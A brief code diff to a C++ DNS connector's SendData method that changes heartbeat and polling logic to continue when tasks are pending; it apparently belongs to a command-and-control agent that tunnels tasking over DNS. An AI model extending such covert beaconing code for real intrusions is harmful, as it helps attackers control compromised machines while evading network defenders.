@@ -886,10 +886,13 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         return;
     }
 
-    // Send heartbeat if no pending download
-    if (!this->forcePoll && !this->downBuf && this->qtype[0] == 'T') {
+    // Send heartbeat if no pending download and no pending tasks
+    if (!this->forcePoll && !this->downBuf && !this->hasPendingTasks) {
         SendHeartbeat();
-        return;
+        // If heartbeat indicates pending tasks, continue to API request
+        if (!this->hasPendingTasks) {
+            return;
+        }
     }
 
     if (this->forcePoll) {
